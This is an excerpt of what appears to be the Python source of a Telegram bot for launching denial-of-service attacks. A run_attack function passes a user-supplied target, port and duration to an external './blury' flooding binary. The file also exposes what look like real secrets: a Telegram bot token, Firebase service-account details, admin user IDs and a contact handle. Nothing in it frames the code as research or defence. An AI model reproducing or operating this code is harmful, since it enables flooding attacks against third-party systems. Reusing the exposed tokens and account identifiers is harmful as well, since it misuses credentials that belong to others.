...
firebase_credentials = {
  ...
  "project_id": "papa-b3b9e",
  "private_key_id": "25b38c3730a8dfd1ec974caf04f688064b8776d2",
  "private_key": "-----BEGIN PRIVATE KEY-----\\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-fbsvc@papa-b3b9e.iam.gserviceaccount.com",
  "client_id": "116426555431004472795",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40papa-b3b9e.iam.gserviceaccount.com",
...
bot_token = '7239021384:AAH2nNKrkZu8VLwxjBdMUjYC4kyJpYYIOvE'  # Replace with your bot token
...
ADMIN_IDS = [7221087191, 5736732360] # Replace with the actual admin's user ID
...
def run_attack(target, port, attack_time, sent_message):
    try:
        full_command = f"./blury {target} {port} {attack_time} 55"
...
def handle_contact_admin(message):
    bot.reply_to(message, f"📞 @spec890i: {ADMIN_ID}")
